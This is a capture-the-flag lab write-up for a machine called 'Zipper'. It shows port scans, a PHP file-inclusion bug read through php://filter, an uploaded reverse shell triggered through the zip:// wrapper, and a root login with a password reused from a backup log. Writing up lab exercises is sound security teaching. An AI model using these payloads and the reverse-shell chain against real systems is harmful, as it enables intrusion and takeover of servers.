Zipper

Target IP: 192.168.142.229
Challenge Description: N/A.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.142.229 -p- returns the result shown in the image above. There are two TCP ports open on the target machine: SSH and HTTP on their standard ports.


I ran an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.142.229 -p 22,80 and obtained the result shown in the picture above. From this scan result, it looks like the target machine is running OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 as the SSH application on port 22. On port 80, the web server application is Apache httpd 2.4.41. The target machine is serving a web application by the name Zipper. Time to check it out.

Enumeration

Port 80: HTTP

The webpage shown in the picture above is returned for this web application on port 80. It allows users to upload basic files, such as images, scripts, etc., and create a ZIP archive file out of it. The application also stores the zipped file. This sounds like a useful application. I pressed the different buttons on the web application, and I notice something that caught my attention: file parameter in the URL. Is this web application vulnerable to LFI/RFI?


I performed a directory search using the command feroxbuster -u http://192.168.142.229 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,jpg,yml,cfg,js -d 6 --scan-dir-listings -C 404 and obtained the result shown in the image above. It looks like the web application stores our file uploads at http://192.168.142.229/uploads. However, the HTTP status code of 301 is returned; therefore, I might not be able to access it. I am guessing the upload.php and home.php are the usual pages of the web application. Time to test the upload functionality.


I created three test text files on my machine. When attempting to upload the files, I notice there is no filter in place as All Files are supported. This is a good sign as we could upload malicious PHP files using File Upload attack to own the server.


After successfully uploading my test files, I was provided a hyperlink where I could download the uploaded file in a ZIP format. In the picture above, I have highlighted this in yellow. The file was as to upload_1735679435.zip over at http://192.168.142.229/uploads. I notice the naming convention of the uploaded file is a bit mysterious. Time to test if I can access these files. However, I cannot access the uploaded file whatsoever.


When attempting to perform directory traversal to read the files such as the /etc/passwd on the machine, I have no luck as shown in the picture above. Nothing is returned.


However, when I use PHP filters to read the files in base64 -- I succeed. For example, in the image above, I read the index.php file using the PHP filter php://filter/convert.base64-encode/resource=index. I originally tried appending the .php extension but I didn't have any luck. It looks like the web application appends the .php extension automatically. Using the PHP filter, I obtained the index.php in base64: PD9waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwppZihpc3NldCgkZmlsZSkpCnsKICAgIGluY2x1ZGUoIiRmaWxlIi4iLnBocCIpOwp9CmVsc2UKewppbmNsdWRlKCJob21lLnBocCIpOwp9Cj8+Cg==.


And bingo. Decoding the base64 string returns the code shown in the image above. It seems like the .php extension is automatically added; otherwise, the home.php is shown. The PHP code after decoding it is the following:

<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file".".php");
}
else
{
include("home.php");
}
?>

include("home.php");

Using the same technique, I managed to read the upload.php file too. The full URL with the PHP filter is http://192.168.142.229/index.php?file=php://filter/read=convert.base64-encode/resource=upload. After decoding the base64 string, I obtained the following code:

<?php
if ($_FILES && $_FILES['img']) {
    if (!empty($_FILES['img']['name'][0])) {
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}

The source code of upload.php, shown above, is self-explanatory. Since the input is converted to ZIP and saved on the server, I can use the ZIP PHP wrapper to attempt to access the file. The ZIP PHP wrapper can be abused to perform RCE on the target machine. Let's summarise what we know about the target machine. The SSH application on port 22 is OpenSSH 8.2p1 Ubuntu 4ubuntu0.3. But I do not have any usernames. On the other side, the web application allows users to upload files and convert them to a ZIP file. These files are stored on the backend server by the web application. It seems to be vulnerable to Directory Traversal. When I tried to access the /etc/passwd file, I failed. I attempted to use the NULL bytes (%00) after the payload but I failed since the application automatically adds .php extension. One potential attack vector is the following: upload a malicious PHP file that invokes a reverse shell connection to my machine, and use the PHP ZIP wrapper to invoke the file.

Exploitation

Owning the Web Application via File Upload Attack & PHP ZIP Wrapper

On my machine, I created a file by the name sh3ll.php. Inside this file, it contains the PHP Pentest Monkey Reverse Shell as shown in the image above. When this script is run, it will invoke a reverse shell connection to my machine at port 80. This can be obtained from here. I uploaded this file as sh3ll.php without converting it to ZIP. When I checked the download link, it is http://192.168.142.229/uploads/upload_1735681302.zip. Then I started a listener on my machine at port 80. Time to craft the ZIP wrapper for RCE. There are a few things to keep in mind. To play safe, I didn't attempt to upload a simple PHP webshell. Instead I decided to go for PHP Pentest Monkey as it is easy to execute the specific file inside a ZIP file using the PHP ZIP wrapper. Also, it doesn't help the fact that the .php extension is automatically added; therefore, attempting to use PHP webshell becomes awkward. From the source code of upload.php, it states the uploaded files are located at ./uploads/. To access a file inside a ZIP file, we can use the payload: zip://directory/zip_file%23file_name. In this example, to access my sh3ll.php file inside upload_1735681302.zip, I can use the following payload: http://192.168.142.229/index.php?file=zip://./uploads/upload_1735681302.zip%23sh3ll. Keep in mind the %23 is URL encoded character #. This character is used to select the different files inside the ZIP file. PHP ZIP Wrapper RCE is greatly explained here.


And bingo. I obtained a reverse shell connection with the session as www-data on port 80 on my machine. Time to elevate my privileges on the target machine.

Privilege Escalation

Vertical Privilege Escalation: User www-data to User root via Reusing Password Inside backup.log

After obtaining a shell on the target machine, I checked for cronjobs using the command cat /etc/crontab. Then I obtained the result shown in the picture above. There is an active script by the name backup.sh at /opt. Time to check it out.


Before checking the script, I checked out the backups directory. Inside this directory, there are two files: backup.zip and backup.log. I checked the backup.log and identified the unusual string WildCardsGoingWild that looks similar to a password as shown in the picture above.


And using the command su root and the password WildCardsGoingWild, I managed to successfully switch to user root as shown in the picture above. Now I have a root shell on the target machine. There are a lot of rabbit holes in this box, especially during the privilege escalation stage. I spent a lot of time enumerating the enox.zip file -- if you know, you know ;)
